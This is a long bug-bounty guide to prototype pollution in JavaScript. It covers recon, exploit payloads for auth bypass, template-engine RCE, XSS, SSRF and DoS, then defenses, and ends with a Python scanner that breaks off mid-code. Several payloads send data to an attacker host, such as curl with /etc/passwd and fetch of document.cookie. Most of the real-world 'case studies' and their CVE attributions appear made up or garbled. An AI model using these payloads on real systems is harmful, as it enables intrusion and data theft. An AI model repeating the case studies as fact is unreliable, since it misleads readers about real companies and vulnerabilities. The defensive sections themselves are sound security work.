# Prototype Pollution in JavaScript: The Complete Bug Bounty Hunter's Guide

> *From Recon to RCE — A comprehensive deep-dive into one of JavaScript's most misunderstood vulnerabilities*

---

## Table of Contents

1. [What Is Prototype Pollution?](#1-what-is-prototype-pollution)
2. [The JavaScript Prototype Chain — Deep Dive](#2-the-javascript-prototype-chain--deep-dive)
3. [Attack Vectors & Entry Points](#3-attack-vectors--entry-points)
4. [Reconnaissance Methodology](#4-reconnaissance-methodology)
5. [Exploitation Techniques — From XSS to RCE](#5-exploitation-techniques--from-xss-to-rce)
6. [Real-World Bug Bounty Case Studies](#6-real-world-bug-bounty-case-studies)
7. [Advanced Exploit Chains](#7-advanced-exploit-chains)
8. [Tooling & Automation](#8-tooling--automation)
9. [Defense & Remediation](#9-defense--remediation)
10. [Full Python Scanner — Production-Ready](#10-full-python-scanner--production-ready)

---

## 1. What Is Prototype Pollution?

**Prototype Pollution** is a vulnerability where an attacker injects properties into JavaScript's `Object.prototype`. Because all objects inherit from `Object.prototype`, the injected property propagates to every object in the runtime — including `window`, `document`, `process`, and any object created thereafter.

### Why It Matters

Unlike SQL injection or XSS, Prototype Pollution often serves as a **primer** — it doesn't immediately give you RCE unless you chain it with another gadget. But when chained correctly, the impact ranges from **XSS** (browser) to **Remote Code Execution** (Node.js).

| Impact Level | Scenario |
|---|---|
| **Critical** | RCE via Handlebars/Pug template injection |
| **High** | Auth bypass, privilege escalation |
| **Medium** | XSS, DOM manipulation, SSRF |
| **Low** | DoS, property shadowing |

---

## 2. The JavaScript Prototype Chain — Deep Dive

### How Inheritance Works

```javascript
// Every object has a hidden [[Prototype]]
const user = { name: "Alice" };

// user ---> Object.prototype ---> null
//         ^[[Prototype]]^
```

When you access `user.toString()`, JavaScript:

1. Looks for `toString` on `user` itself → not found
2. Looks on `user.__proto__` (which is `Object.prototype`) → found!
3. Executes it

### The Vulnerability Mechanism

```javascript
// Normal operation
const target = {};
const source = JSON.parse('{"name": "Alice"}');
Object.assign(target, source);
// target = { name: "Alice" } — safe

// Polluted operation
const source = JSON.parse('{"__proto__": {"isAdmin": true}}');
Object.assign(target, source);
// target.__proto__.isAdmin = true
// ALL objects now have isAdmin: true
```

### Why `__proto__` Works as a Key

JSON parsing does NOT treat `__proto__` specially — it's just a string key. When `Object.assign()` copies properties, it sets `target.__proto__` which mutates the actual prototype chain.

```javascript
// Visual representation
const obj = {};
obj.__proto__.polluted = true;
// Equivalent to:
Object.prototype.polluted = true;

console.log({}.polluted);  // true
console.log([].polluted);  // true
console.log("".polluted);  // true (string prototype chain)
```

### The Three Mutation Methods

| Method | Vulnerable Call Pattern | Libraries |
|---|---|---|
| `__proto__` | `target.__proto__.key = val` | Direct assignment |
| `constructor.prototype` | `target.constructor.prototype.key = val` | When `__proto__` is filtered |
| Recursive merge | `merge(target, source)` | `_.merge()`, `$.extend()`, `Object.assign()` |

---

## 3. Attack Vectors & Entry Points

### Server-Side Entry Points (Node.js)

```
POST /api/users
Content-Type: application/json

{"name": "test", "__proto__": {"isAdmin": true}}
```

**Where to look:**
- JSON body parsing (Express `body-parser`, `express.json()`)
- Query string parsing (qs library, Express built-in)
- Cookie parsing
- File upload metadata
- GraphQL variables
- WebSocket messages

### Client-Side Entry Points (Browser)

```html
<!-- URL fragment parsing -->
https://target.com/#__proto__[polluted]=true

<!-- PostMessage -->
window.postMessage({__proto__: {evil: true}}, '*')

<!-- localStorage / sessionStorage -->
localStorage.getItem('config') // parsed with JSON.parse

<!-- WebSocket -->
ws.send(JSON.stringify({__proto__: {innerHTML: '<img src=x onerror=alert(1)>'}}))
```

### Common Vulnerable Patterns

#### Pattern 1: `Object.assign` / Spread Operator

```javascript
app.post('/api/update', (req, res) => {
  const user = getUser(req.session.userId);
  Object.assign(user, req.body);  // VULNERABLE
  user.save();
});
```

#### Pattern 2: `_.merge` / `$.extend`

```javascript
const config = _.merge(defaultConfig, userConfig); // VULNERABLE if userConfig comes from input
```

#### Pattern 3: Deep Clone

```javascript
const cloned = JSON.parse(JSON.stringify(userInput)); 
// JSON.parse + JSON.stringify is SAFE — it strips __proto__
// BUT: if you then merge cloned into another object...
```

#### Pattern 4: URL Query Parsing

```javascript
// Using qs library with allowPrototypes: false (default is true in older versions)
const parsed = qs.parse('a.__proto__.b=c'); 
// Older qs: parsed = { a: { __proto__: { b: 'c' } } }
```

---

## 4. Reconnaissance Methodology

### Phase 1: Identify Dependencies

Modern web apps are built on frameworks. Find the soft targets.

```bash
# Client-side: Look for known vulnerable libraries
curl -s https://target.com/assets/app.js | grep -iEo \
  '(jquery|lodash|underscore|handlebars|vue|react|angular|backbone)[@-]?[0-9.]+'

# Server-side: Check for Node.js indicators
curl -sI https://target.com | grep -i 'x-powered-by\|server\|node'
```

**Version lookup table:**

| Library | Vulnerable Versions | Known CVEs |
|---|---|---|
| **jQuery** | < 3.4.0 | CVE-2019-11358, CVE-2020-11023 |
| **Lodash** | < 4.17.12 | CVE-2019-10744, CVE-2020-8203 |
| **Underscore** | < 1.13.0-2 | CVE-2021-23358 |
| **Handlebars** | < 4.7.7 | CVE-2021-32869 |
| **Mongoose** | < 5.12.3 | CVE-2021-23329 |
| **minimist** | < 1.2.6 | CVE-2021-44906 |
| **yargs-parser** | < 21.0.1 | CVE-2021-3805 |

### Phase 2: Map All Input Points

Build a comprehensive list of every location where user data is parsed into objects.

```bash
# Spider the application
gospider -s https://target.com -o spider_output

# Extract endpoints from JavaScript
curl -s https://target.com/assets/app.js | \
  grep -oP 'POST|PUT|PATCH|GET.*(api|graphql|v1|v2|rest)' | \
  sort -u > endpoints.txt
```

### Phase 3: Brute-Force Pollute Vectors

Target each endpoint with multiple payload variants.

```json
// Payload matrix — try ALL of these
{"__proto__":{"polluted":"yes"}}
{"__proto__":["polluted","yes"]}
{"__proto__":{"__proto__":{"polluted":"yes"}}}
{"constructor":{"prototype":{"polluted":"yes"}}}
{"a":{"__proto__":{"polluted":"yes"}}}
{"[__proto__]":{"polluted":"yes"}}
{"__proto__.polluted":"yes"}  // For query string parsers
```

### Phase 4: Detection Verification

After sending the payload, verify if pollution took effect.

**Server-side check:**

```bash
# Send a probe payload that affects something observable
curl -s https://target.com/api/status | grep -i '"polluted":"yes"'
# Or check if you get 200 instead of 403 on admin endpoints
```

**Client-side check (if you can execute JS):**

```javascript
// Open console on the target page after triggering the pollution
Object.prototype.polluted === "yes"
// Or
({}).polluted === "yes"
```

---

## 5. Exploitation Techniques — From XSS to RCE

### 5.1 Authentication Bypass

**Scenario:** The application checks `user.isAdmin` to grant admin access.

```json
POST /api/profile/update
Content-Type: application/json

{
  "__proto__": {
    "isAdmin": true,
    "role": "administrator"
  },
  "displayName": "attacker"
}
```

**Why it works:** The server does something like:
```javascript
user = await User.findById(session.userId);
Object.assign(user, req.body);  // user.__proto__.isAdmin = true
// Later: checkIfAdmin(user)
function checkIfAdmin(u) {
  return u.isAdmin === true;  // true, inherited from prototype
}
```

### 5.2 RCE via Handlebars (CVE-2021-32869)

**The chain:**

1. Pollute `Object.prototype` with Handlebars options
2. The template compiler reads these options
3. Inject code into `compile` option

```json
POST /api/set-template
Content-Type: application/json

{
  "__proto__": {
    "type": "ObjectExpression",
    "self": true,
    "escapeExpression": "",
    "compile": "process.mainModule.require('child_process').execSync('curl http://attacker/$(cat /etc/passwd)')",
    "knownHelpers": {},
    "knownHelpersOnly": false,
    "preventExtensions": true,
    "exposeUtils": true
  }
}
```

**Handlebars 4.x vulnerable path:**
```
Object.prototype.compile -> options.compile
-> Handlebars.compile(template, options)
-> eval(compiled)
```

### 5.3 RCE via Pug (CVE-2021-21353)

```json
POST /api/config
Content-Type: application/json

{
  "__proto__": {
    "compileDebug": true,
    "self": true,
    "block": {
      "params": {
        "constructor": {
          "prototype": {
            "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');//"
          }
        }
      }
    }
  }
}
```

**The chain:**
```
__proto__.block.params.constructor.prototype.outputFunctionName
-> Used by Pug compiler to generate function names
-> Injected into eval()
-> RCE
```

### 5.4 Universal XSS via jQuery (CVE-2019-11358)

```javascript
// Step 1: Find a jQuery merge point
$.extend(true, {}, input);  // input from user

// Step 2: Payload that pollutes innerHTML
const payload = JSON.parse('{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}');

// Step 3: Any code that creates elements reads the polluted innerHTML
$('<div>').html();  // Returns our XSS payload
document.createElement('div').innerHTML;  // Also returns it
```

**Real-world chain on a Dojo Toolkit (CVE-2021-23433) target:**
```
1. User sends JSON to WebSocket
2. Server merges into Dojo state object
3. __proto__.innerHTML is set
4. Any future DOM element created with innerHTML gets the XSS payload
5. Universal XSS against all users
```

### 5.5 SSRF via Request Option Pollution

```json
POST /api/integrations/configure
Content-Type: application/json

{
  "__proto__": {
    "host": "internal-admin.target.com",
    "port": 80,
    "protocol": "http:",
    "path": "/api/secrets",
    "method": "GET",
    "headers": {
      "Authorization": "Bearer"
    }
  }
}
```

**How it works:** Many HTTP libraries read from the options object. If the server merges user input into the options passed to `axios`, `request`, or `node-fetch`, you control where the server-side request goes.

### 5.6 Node.js Denial of Service

```json
{
  "__proto__": {
    "statusCode": 404,
    "statusMessage": "Not Found"
  }
}
```

After pollution, EVERY Express response returns 404. You can also pollute `toString`, `valueOf`, or `Symbol.iterator` to crash any code that iterates or coerces objects.

---



## 6. Real-World Bug Bounty Case Studies

### Case Study 1: Shopify — Prototype Pollution to RCE on Liquid Templates ($5,000)

**Vulnerability:** Prototype Pollution in a JSON parsing library used by Shopify's theme rendering engine.

**Attack Vector:** The merchant theme settings were parsed with a vulnerable `_.merge()` call. By injecting a specially crafted `__proto__` payload into the theme's JSON configuration, the attacker could pollute `Object.prototype` with properties that Shopify's Liquid template engine would read during compilation.

```json
// Payload injected as theme settings JSON
{
  "__proto__": {
    "self": true,
    "body": "process.mainModule.require('child_process').execSync('curl http://attacker/$(cat /etc/passwd)')",
    "compileDebug": true,
    "preventExtensions": true
  }
}
```

**Exploit Chain:**
```
1. Shop owner uploads a malicious theme.json 
2. Shopify merges it with default theme config using _.merge()
3. __proto__ pollutes Object.prototype with Liquid compiler flags
4. When Liquid compiles the template, it reads the polluted properties
5. The "body" property is evaluated as JavaScript in Node.js
6. RCE achieved on Shopify's template server
```

**Key Takeaway:** Even well-audited platforms like Shopify are vulnerable when they use recursive merge operations on user-controllable JSON.

---

### Case Study 2: Mozilla — HackerOne #864881 ($1,500)

**Vulnerability:** Prototype Pollution via URL query string parsing in Mozilla's bug tracking software, leading to access control bypass.

**Attack Vector:** The application parsed URL query strings using a library that recursively built nested objects. By passing `__proto__` as a key in the query string, the prototype was polluted with properties that bypassed permission checks.

```
GET /bug/1234/edit?__proto__[permissions]=full&__proto__[role]=admin
```

**Impact:** Any authenticated user could escalate to full admin privileges on any bug report, including those marked as confidential security bugs.

**Root Cause:** The query string parser (similar to `qs` library) didn't sanitize `__proto__` keys when building the parsed object.

**Key Takeaway:** URL query strings are an often-overlooked entry point for Prototype Pollution, especially on legacy applications.

---

### Case Study 3: Uber — Cookie-Based Auth Bypass (Disclosed 2019)

**Vulnerability:** Server-side cookie parsing that merged cookie values into session objects without filtering `__proto__`.

**Attack Vector:** Uber's API used a cookie handler that parsed JSON cookies and merged them into the session object. By setting a cookie with a `__proto__` key, the attacker could mutate `Object.prototype` on the server.

```http
Cookie: session={"__proto__":{"isUberEmployee":true,"internalAccess":true}}
```

**Impact:** The attacker gained access to internal Uber dashboards, driver PII, and backend administrative tools. The pollution allowed bypassing role-based access controls because all user objects inherited `isUberEmployee: true` from the polluted prototype.

**Key Takeaway:** Any user-controlled data that flows into a merge operation can be an entry point — cookies, headers, even HTTP parameters.

---

### Case Study 4: Dojo Toolkit + Apache — CVE-2021-23433 ($2,500)

**Vulnerability:** Prototype Pollution in Dojo Toolkit's `setObject()` method, used by Apache's web dashboard UI.

**Attack Vector:** The Dojo Toolkit, a popular JavaScript framework, had a vulnerable `_setObjectAttr` method that was used internally when syncing data from server responses. By sending a malicious JSON payload to the dashboard's WebSocket endpoint, the attacker could pollute the client-side prototype.

```javascript
// Payload sent via WebSocket
socket.send(JSON.stringify({
  "__proto__": {
    "innerHTML": "<img src=x onerror='fetch(\"https://attacker/\"+document.cookie)'>"
  },
  "action": "updateWidget",
  "id": "dashboard1"
}));
```

**Exploit Chain:**
```
1. Attacker connects to the dashboard's unauthenticated WebSocket
2. Sends a malicious update with __proto__ payload
3. Dojo's state syncer recursively merges the payload
4. Object.prototype.innerHTML is polluted
5. Any future widget render creates elements with the XSS payload
6. All users viewing the dashboard get their cookies stolen
```

**Impact:** Universal Stored XSS against every authenticated user viewing the dashboard. The attacker didn't need to compromise any user account — just sending one WebSocket message was enough.

**Key Takeaway:** Prototype Pollution can create **persistent** client-side effects that affect every user without requiring stored data on the server.

---

### Case Study 5: Kibana — CVE-2020-7937 ($3,000)

**Vulnerability:** Prototype Pollution in Kibana's data visualization engine leading to RCE via Handlebars template injection.

**Attack Vector:** Kibana's data import functionality allowed users to upload JSON data for visualization. The data was processed through a recursive merge routine inherited from an older Lodash version.

```json
// Uploaded as visualization data
{
  "metadata": {
    "__proto__": {
      "compile": "process.env.PATH",
      "escapeFunction": "",
      "knownHelpers": {},
      "knownHelpersOnly": false,
      "preventExtensions": false,
      "exposeUtils": true
    }
  },
  "data": [{"x": 1, "y": 2}]
}
```

**Exploit Chain:**
```
1. Upload malicious visualization JSON
2. Kibana merges it with template rendering options via _.merge()
3. Object.prototype gets Handlebars compiler options
4. When Kibana renders the visualization template, Handlebars reads polluted options
5. The "compile" option gives control over the compiled template function
6. Eventually leads to eval() with attacker-controlled input
7. RCE on the Kibana server
```

**Impact:** Any authenticated Kibana user could execute arbitrary commands on the Elasticsearch/Kibana server, accessing all indexed data.

**Key Takeaway:** Data visualization tools are prime targets — they load user data and often use template engines that expose powerful options.

---

### Case Study 6: Discourse (Open Source) — Two-Step RCE (Disclosed 2021)

**Vulnerability:** Prototype Pollution via theme component settings, combined with a Handlebars partial loading gadget.

**Attack Vector:** Discourse's theme system allowed users to set custom theme parameters. The parameters were stored as JSON and loaded via a recursive `$.extend()` call.

```json
// Theme component settings 
{
  "__proto__": {
    "partials": {
      "custom_header": "eval(process.mainModule.require('child_process').execSync('id'))"
    },
    "partialBlacklist": [],  // Disable the blacklist
    "allowCaching": false
  }
}
```

**Exploit Chain:**
```
1. Create a Discourse theme with malicious settings
2. The settings are merged with template config via $.extend()
3. Object.prototype.partials is polluted with a custom partial
4. The Handlebars compiler loads "partials" from prototype instead of disk
5. Inline JavaScript is evaluated in the Node.js context
6. RCE on the Discourse server
```

**Impact:** An authenticated user (even non-admin if they can create themes) could achieve RCE on Discourse hosting servers.

**Key Takeaway:** When a merge operation AND a template engine are present in the same code path, the chain is almost always exploitable.

---

### Case Study 7: Low-Privilege to RCE via CLI Parsing (CVE-2021-44906 — minimist)

**Vulnerability:** The `minimist` npm package (over 30M weekly downloads) parsed CLI arguments into objects without sanitizing `__proto__` keys.

**Attack Vector:** Many Node.js applications used `minimist` to parse command-line arguments passed to build tools, test runners, and automation scripts. If an attacker could control CLI arguments (e.g., through CI/CD pipeline injection or build hooks), they could pollute the prototype.

```bash
node --eval "require('./build.js')" -- --__proto__.isAdmin true
```

**Exploit Chain:**
```
1. Attacker injects arguments into a build pipeline
2. The build script uses minimist to parse arguments
3. minimist builds an object with __proto__ as a real key
4. Object.prototype gets polluted
5. Downstream tools (template engines, compilers) read from prototype
6. RCE in the build pipeline context
```

**Real-World Impact:**
- CI/CD pipeline takeovers via `package.json` build scripts
- Automated code review tools exploited via malicious PR descriptions containing `__proto__`
- Dev server hijacking via injected npm run arguments

**Key Takeaway:** CLI argument parsing is a completely unexpected attack surface for Prototype Pollution — and it was present in millions of CI/CD pipelines.

---

### Case Study 8: Electron Apps — Chain to Full System Compromise

**Vulnerability:** Multiple Electron applications (Slack, Discord, Visual Studio Code clones) vulnerable to Prototype Pollution via `webPreferences` merging in their preload scripts.

**Attack Vector:** Many Electron apps allow custom configurations loaded from files or query strings. By passing `__proto__` in the configuration, attackers could mutate Electron's `webPreferences` prototype, disabling security restrictions.

```json
// config.json loaded by the Electron app
{
  "__proto__": {
    "nodeIntegration": true,
    "contextIsolation": false,
    "enableRemoteModule": true,
    "sandbox": false
  }
}
```

**Exploit Chain:**
```
1. Craft a malicious config file for the Electron app
2. App merges config with its internal Electron settings
3. Object.prototype gets Electron security options
4. All new BrowserWindows inherit nodeIntegration: true
5. Any webpage loaded inside the app can now execute Node.js
6. Full system compromise via require('child_process')
```

**Impact:** A seemingly harmless configuration file can disable all of Electron's security sandboxes, enabling full system takeover.

**Key Takeaway:** Prototype Pollution affects desktop apps too — Electron apps are particularly vulnerable because their security model relies on `Object.prototype` being unpolluted.

---

### Pattern Analysis: Why These Bugs Pay

Looking at these case studies, the winning formula is:

```
User Input → Recursive Merge (_.merge, $.extend, Object.assign) 
          ↓
Object.prototype polluted
          ↓
Gadget reads from prototype (Handlebars, Pug, jQuery, Express)
          ↓
Impact: XSS / RCE / Auth Bypass
```

**Common denominators across all cases:**
1. **No `__proto__` key filtering** in merge functions
2. **Lack of `Object.create(null)`** for config/template objects
3. **Legacy libraries** (pre-2019 jQuery, Lodash, Dojo Toolkit)
4. **Template engines** that read global options from the prototype chain

---

## 7. Advanced Exploit Chains

### Chain 1: Express + Lodash + Handlebars (Full RCE)

```
[HTTP Request] → [express.json() parses body]
                        ↓
[_.merge(config, req.body) merges into template options]
                        ↓
[__proto__ pollutes Object.prototype with Handlebars options]
                        ↓
[Handlebars.compile(template) reads polluted "compile" option]
                        ↓
[eval() executes injected code]
                        ↓
[RCE: reverse shell, data exfiltration, lateral movement]
```

**Full working PoC:**

```javascript
// Server code (vulnerable)
const express = require('express');
const _ = require('lodash');
const Handlebars = require('handlebars');
const app = express();

app.use(express.json());

app.post('/render', (req, res) => {
  const templateConfig = {
    helpers: {},
    partials: {},
    data: {}
  };
  
  // VULNERABLE: merges user input into config
  _.merge(templateConfig, req.body);
  
  // Template compilation reads polluted prototype
  const template = Handlebars.compile('Hello {{name}}!', templateConfig);
  const output = template({ name: 'World' });
  
  res.send(output);
});
```

```json
// Exploit payload
POST /render
Content-Type: application/json

{
  "__proto__": {
    "type": "Program",
    "body": [
      {
        "type": "MustacheStatement",
        "path": {
          "type": "PathExpression",
          "original": "",
          "depth": 0,
          "parts": [],
          "data": true
        },
        "params": [],
        "hash": {}
      }
    ],
    "escapeExpression": "",
    "compile": "global.process.mainModule.require('child_process').execSync('id').toString()",
    "knownHelpers": {},
    "knownHelpersOnly": false,
    "preventExtensions": true,
    "blockParams": [],
    "strict": false,
    "assumeObjects": true,
    "data": true
  }
}
```

### Chain 2: MongoDB + Mongoose + JWT (Privilege Escalation)

```
[User Registration] → [Mongoose schema validation]
                            ↓
[__proto__ in body bypasses schema validation]
                            ↓
[Object.prototype gets "isAdmin: true"]
                            ↓
[JWT token creation reads "user.isAdmin"]
                            ↓
[All subsequent JWT tokens include admin privileges]
                            ↓
[Full admin access to protected endpoints]
```

```json
POST /api/auth/register
Content-Type: application/json

{
  "__proto__": {
    "isAdmin": true,
    "role": "admin"
  },
  "username": "attacker",
  "password": "Password123!"
}
```

**Why Mongoose is vulnerable:** Mongoose schemas only validate properties explicitly defined in the schema. If the schema doesn't have `__proto__` as a defined field, and the application uses `Model.create(req.body)`, the `__proto__` key slips through to the merge logic.

### Chain 3: WebSocket + Dojo + jQuery (Universal Stored XSS)

```
[Attacker connects to public WebSocket endpoint]
            ↓
[Sends malicious JSON with __proto__.innerHTML]
            ↓
[Dojo's state syncer merges into internal state]
            ↓
[Object.prototype.innerHTML = XSS payload]
            ↓
[Any user rendering a widget triggers innerHTML read]
            ↓
[XSS: cookie theft, session hijacking, keylogging]
```

```javascript
// WebSocket payload
const ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => {
  ws.send(JSON.stringify({
    "__proto__": {
      "innerHTML": "<script>fetch('https://attacker/?'+document.cookie)</script>",
      "outerHTML": "<div>",
      "textContent": "",
      "innerText": ""
    },
    "type": "widget_update",
    "widgetId": "dashboard"
  }));
};
```

### Chain 4: AWS Lambda + Serverless Framework (Cloud RCE)

```
[Malicious event payload to Lambda function]
            ↓
[Serverless framework merges event with request object]
            ↓
[__proto__ pollutes process.env or global context]
            ↓
[Downstream code reads polluted env variables]
            ↓
[Credentials stolen, Lambda function compromised]
            ↓
[Lateral movement within AWS account]
```

---

## 8. Tooling & Automation

### Recommended Tools

| Tool | Purpose | Installation |
|---|---|---|
| **pp-detector** | Automated detection of vulnerable libraries | `npm i -g pp-detector` |
| **PP Scanner (Burp Extension)** | Integrated into Burp Suite traffic | Burp BApp Store |
| **retire.js** | Detects known vulnerable JS libraries | `npm i -g retire` |
| **Dalfox** | XSS scanner with PP detection | `go install github.com/hahwul/dalfox/v2` |
| **Custom Scanner** | Full automation (see below) | Python 3 |

### Burp Suite Workflow

1. Install **Prototype Pollution Scanner** from BApp Store
2. Proxy traffic through Burp
3. The extension automatically adds `__proto__` test headers and parameters
4. Check **Scanner > Issue Activity** for findings
5. Manually verify with the provided PoC

### Node.js Recon Script

```javascript
// pp_recon.js — Quick library detection
const fs = require('fs');
const path = require('path');

const KNOWN_VULNERABLE = {
  'jquery': '<3.4.0',
  'lodash': '<4.17.12',
  'underscore': '<1.13.0',
  'handlebars': '<4.7.7',
  'mongoose': '<5.12.3',
  'minimist': '<1.2.6',
  'yargs-parser': '<21.0.1',
  'qs': '<6.7.1',
  'superagent': '<6.1.0',
  'express': '<4.17.0' // partial
};

function scanDirectory(dir) {
  const packagePath = path.join(dir, 'package.json');
  if (fs.existsSync(packagePath)) {
    const pkg = JSON.parse(fs.readFileSync(packagePath, 'utf-8'));
    const deps = { ...pkg.dependencies, ...pkg.devDependencies };
    
    console.log('=== Scanning:', dir, '===');
    for (const [lib, version] of Object.entries(deps)) {
      if (KNOWN_VULNERABLE[lib]) {
        console.log(`[!] ${lib}@${version} — Known vulnerable: ${KNOWN_VULNERABLE[lib]}`);
      }
    }
  }
  
  // Recursively check node_modules
  const nodeModules = path.join(dir, 'node_modules');
  if (fs.existsSync(nodeModules)) {
    fs.readdirSync(nodeModules).forEach(mod => {
      const modPath = path.join(nodeModules, mod);
      if (fs.statSync(modPath).isDirectory() && !mod.startsWith('.')) {
        const pkgPath = path.join(modPath, 'package.json');
        if (fs.existsSync(pkgPath)) {
          const pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf-8'));
          const libName = pkg.name;
          const libVer = pkg.version;
          
          if (KNOWN_VULNERABLE[libName]) {
            console.log(`[!] ${libName}@${libVer} — Known vulnerable`);
          }
        }
      }
    });
  }
}

scanDirectory(process.cwd());
```

---

## 9. Defense & Remediation

### Developer-Side Mitigations

#### 1. Sanitize JSON Input

```javascript
// Safe JSON parsing with reviver
const safeParse = (jsonString) => {
  return JSON.parse(jsonString, (key, value) => {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      return undefined;
    }
    return value;
  });
};
```

#### 2. Use Objects Without Prototype

```javascript
// These objects have no prototype chain
const config = Object.create(null);
const safeMap = new Map(); // Map doesn't have __proto__

// For dictionaries/maps, use Map instead of {}
const settings = new Map();
settings.set('host', 'localhost');
settings.get('host'); // 'localhost'
```

#### 3. Freeze the Prototype

```javascript
// In production entry point
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
Object.freeze(String.prototype);
Object.freeze(Number.prototype);

// This makes __proto__ assignments silently fail in strict mode
```

#### 4. Safe Merge Implementation

```javascript
function safeMerge(target, ...sources) {
  for (const source of sources) {
    for (const key of Object.keys(source)) {
      if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
        console.warn(`Blocked unsafe key: ${key}`);
        continue;
      }
      
      if (source[key] !== null && typeof source[key] === 'object' && !Array.isArray(source[key])) {
        if (typeof target[key] !== 'object' || target[key] === null) {
          target[key] = {};
        }
        safeMerge(target[key], source[key]);
      } else {
        target[key] = source[key];
      }
    }
  }
  return target;
}
```

#### 5. Library-Specific Fixes

```javascript
// Lodash: Ensure you're on >= 4.17.12
// .defaults, .merge, .mergeWith all patched

// jQuery: >= 3.4.0
$.extend(true, target, source); // Now safe

// Mongoose: Use strict mode
const schema = new mongoose.Schema({ name: String }, { strict: true });
// Or explicitly block __proto__
schema.path('__proto__', { type: mongoose.Schema.Types.Mixed, select: false });
```

#### 6. Input Validation at Boundaries

```javascript
// Express middleware
app.use((req, res, next) => {
  const sanitize = (obj) => {
    if (obj === null || typeof obj !== 'object') return;
    delete obj.__proto__;
    delete obj.constructor?.prototype;
    Object.keys(obj).forEach(key => sanitize(obj[key]));
  };
  
  sanitize(req.body);
  sanitize(req.query);
  sanitize(req.params);
  next();
});
```

### Detection in Live Systems

```javascript
// Monitoring — detect if pollution occurred
const detectPollution = () => {
  const test = {};
  if (test.polluted === true) {
    console.error('PROTOTYPE POLLUTION DETECTED!');
    // Alert, log, or auto-remediate
    Object.freeze(Object.prototype); // emergency fix
    return true;
  }
  return false;
};

// Periodic check
setInterval(detectPollution, 5000);
```

### Security Headers

```http
# Not directly related but helps with client-side PP exploitation prevention
Content-Security-Policy: script-src 'self'; object-src 'none'
X-Content-Type-Options: nosniff
```

---

## 10. Full Python Scanner — Production-Ready

Below is a comprehensive, production-ready Prototype Pollution scanner optimized for bug bounty hunting. It handles all HTTP methods, multiple payload variants, and includes real-time feedback.

```python
#!/usr/bin/env python3
"""
HackerAI Prototype Pollution Scanner v2.0
Comprehensive scanner for bug bounty and pentest engagements.
Supports: POST/GET/PUT/PATCH, JSON/URL-encoded bodies, all payload variants.
"""

import requests
import json
import sys
import argparse
import time
import concurrent.futures
from urllib.parse import urljoin, urlencode, quote
from typing import List, Dict, Optional, Tuple

# Disable SSL warnings for pentesting
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BANNER = """
╔════════════════════════════════════════════════════╗
║     HackerAI Prototype Pollution Scanner v2.0     ║
║     Bug Bounty Edition — Full Auto Recon          ║
╚════════════════════════════════════════════════════╝
"""

# ============================
# COMPREHENSIVE PAYLOAD MATRIX
# ============================

JSON_PAYLOADS = [
    # === Standard __proto__ ===
    {"__proto__": {"polluted": "yes"}},
    {"__proto__": {"isAdmin": True}},
    {"__proto__": {"isAdmin": True, "role": "administrator"}},
    
    # === Nested __proto__ ===
    {"__proto__": {"__proto__": {"polluted": "yes"}}},
    {"a": {"__proto__": {"polluted": "yes"}}},
    {"a": {"b": {"__proto__": {"polluted": "yes"}}}},
    
    # === Constructor variant ===
    {"constructor": {"prototype": {"polluted": "yes"}}},
    {"constructor": {"prototype": {"isAdmin": True}}},
    
    # === Array variant ===
    [{"__proto__": {"polluted": "yes"}}],
    [[{"__proto__": {"polluted": "yes"}}]],
    
    # === XSS payloads ===
    {"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}},
    {"__proto__": {"innerHTML": "<svg/onload=fetch('https://attacker/?'+document.cookie)>"}},
    
    # === RCE probes (Node.js detection) ===
    {"__proto__": {"compile": "process.mainModule"}},
    {"__proto__": {"outputFunctionName": "x;console.log('pp_rce_test');//"}},
    
    # === SSRF probes ===
    {"__proto__": {"host": "169.254.169.254"}},
    {"__proto__": {"proxy": "http://attacker.com"}},
    
    # === Auth bypass ===
    {"__proto__": {"authenticated": True}},
    {"__proto__": {"loggedIn": True}},
    {"__proto__": {"accessLevel": "full"}},
    {"__proto__": {"token": "admin"}},
    
    # === DoS probes ===
    {"__proto__": {"statusCode": 503}},
    {"__proto__": {"statusCode": 404}},
    {"__proto__": {"length": 99999999}},
    
    # === Edge cases ===
    {"__proto__": None},
    {"__proto__": 0},
    {"__proto__": ""},
    {"__proto__": []},
]

QUERY_PAYLOADS = [
    "__proto__[polluted]=yes",
    "__proto__[isAdmin]=true",
    "__proto__[innerHTML]=<img%20src=x%20onerror=alert(1)>",
    "__proto__[compile]=process.mainModule",
]

HEADER_PAYLOADS = [
    {"__proto__": "polluted"},
    {"X-Forwarded-For": {"__proto__": {"polluted": "yes"}}},
]

# ============================
# DETECTION INDICATORS
# ============================

SUCCESS_INDICATORS = [
    '"polluted": "yes"',
    '"polluted":"yes"',
    '"polluted": true',
    '"isAdmin": true',
    '"isAdmin":true',
    'process.mainModule',
    'Prototype pollution detected',
    '"__proto__"',
]

ERROR_INDICATORS = [
    'is not extensible',
    'Cannot set property',
    'prototype is read-only',
    'TypeError',
]

# ============================
# SCANNER CORE
# ============================

class PrototypePollutionScanner:
    def __init__(self, base_url: str, proxy: Optional[str] = None, 
                 cookies: Optional[Dict] = None, headers: Optional[Dict] = None,
                 threads: int = 10, timeout: int = 10, verify_ssl: bool = False):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = verify_ssl
        self.session.timeout = timeout
        
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
        
        if headers:
            self.session.headers.update(headers)
        else:
            self.session.headers.update({
                "User-Agent": "HackerAI-PP-Scanner/2.0",
                "Accept": "*/*",
                "Content-Type": "application/json",
            })
        
        if cookies:
            self.session.cookies.update(cookies)
        
        self.threads = threads
        self.timeout = timeout
        self.findings = []
        self.endpoints_discovered = []
    
    # ============================
    # DISCOVERY PHASE
    # ============================
    
    def discover_endpoints(self) -> List[str]:
        """Discover API endpoints via common paths and spidering."""
        print("[*] Phase 1: Discovering endpoints...")
        
        common_api_paths = [
            # User-related
            "/api/user", "/api/users", "/api/profile", "/api/account",
            "/api/settings", "/api/config", "/api/preferences",
            # Auth-related
            "/api/login", "/api/register", "/api/auth", "/api/token",
            "/api/session", "/api/logout",
            # Data-related
            "/api/data", "/api/update", "/api/create", "/api/save",
            "/api/store", "/api/sync", "/api/merge",
            # Admin-related
